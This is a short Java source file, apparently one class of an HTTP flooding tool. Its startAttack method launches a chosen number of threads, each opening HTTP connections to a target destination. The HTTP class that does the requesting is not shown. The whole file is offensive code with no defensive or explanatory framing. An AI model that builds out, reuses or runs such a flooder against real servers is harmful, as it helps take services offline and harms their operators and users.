package main;

public class HTTPThreadable {

    private String destination;
    private Integer threads;

    public HTTPThreadable(String dest, Integer threadnum) {

        destination = dest;
        threads = threadnum;

    }

    public void startAttack() {

        for(int x=0;x<threads;x++) {

            HTTP http_conn = new HTTP(destination);
            http_conn.start();

        }


    }
}
